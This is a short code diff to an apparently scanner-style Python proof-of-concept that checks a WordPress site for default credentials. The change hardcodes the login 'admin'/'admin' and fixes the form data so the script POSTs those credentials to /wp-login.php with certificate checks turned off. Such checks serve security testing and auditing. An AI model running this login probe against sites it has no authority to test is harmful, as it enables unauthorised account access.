@@ -32,6 +32,8 @@ def fingerprint(url):
 # Proof of Concept
 def poc(url):
     result = {}
+    username = "admin"
+    password = "admin"
     try:
         url = format_url(url)
 
@@ -39,7 +41,7 @@ def poc(url):
 
         path = """/wp-login.php"""
         method = "POST"
-        data = """log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1"""
+        data = """log={username}&pwd={password}&wp-submit=Log+In&testcookie=1""".format(username=username, password=password)
         headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check'}
         resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
